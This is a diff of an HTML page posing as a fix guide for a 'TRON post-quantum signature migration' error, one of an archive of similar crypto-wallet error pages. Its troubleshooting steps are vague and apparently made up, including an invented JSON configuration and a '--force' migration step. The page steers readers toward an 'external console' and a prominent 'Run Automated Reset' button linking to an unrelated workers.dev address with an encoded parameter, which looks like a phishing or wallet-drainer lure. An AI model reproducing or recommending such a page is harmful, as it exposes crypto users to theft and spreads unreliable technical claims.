@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TRON Post-Quantum Signature Migration Error – Fix Guide</title>
+<head><meta charset="UTF-8"><title>TRON Post-Quantum Signature Migration Failure – Fix Guide</title>
 <style>
     body {
         font-family: sans-serif;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -39,36 +39,38 @@
 </head>
 <body>
 <div class="content">
-<h1>TRON Post-Quantum Signature Migration Error</h1>
+<h1>TRON Post-Quantum Signature Migration Failure</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users may encounter issues with transaction verification and validation on the TRON network after attempting to migrate to post-quantum signatures, resulting in failed transactions and error messages indicating signature verification failures.</li>
+<li>Users may experience errors when attempting to migrate their TRON signatures to post-quantum signatures, resulting in failed transactions and loss of access to their accounts.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to incompatible signature schemes between the user's wallet and the TRON network, which has transitioned to post-quantum cryptography for enhanced security.</li>
+<li>The error occurs due to incompatible signature formats between the legacy TRON network and the new post-quantum signature scheme, causing the java-tron client to malfunction.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Update the wallet software to the latest version compatible with post-quantum signatures.</li>
-<li>Configure the wallet to use the new post-quantum signature scheme:</li>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Update the java-tron client to the latest version</li>
+<li>Configure the post-quantum signature scheme manually using the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;postQuantum&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;cryptographyVersion&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;v2&quot;</span>
+<span class="w">  </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;post-quantum&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;migrationMode&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;enabled&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
 <ul>
-<li>Perform a full node resync to ensure the local node is updated with the latest blockchain data.</li>
+<li>Run the migration tool with the --force flag to override any compatibility issues
+For a smooth migration, consider utilizing an external console for more advanced troubleshooting.</li>
 </ul>
-<p>Prerequisites:
-* Ensure the TRON network is fully synchronized.
-* Verify the wallet software is compatible with post-quantum signatures.
-* Backup wallet data before attempting any manual overrides.
-For further troubleshooting, consider utilizing an external console to inspect node and wallet configurations.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-confirmations-security-alerts-error-vali.html">Metamask Extension Bug Confirmations Security Alerts Error Validation</a></li></ul>
+<h2>Prerequisites</h2>
+<ul>
+<li>Java-tron client version 4.5 or higher</li>
+<li>TRON network updated to support post-quantum signatures</li>
+<li>Compatible wallet software for post-quantum signature management</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
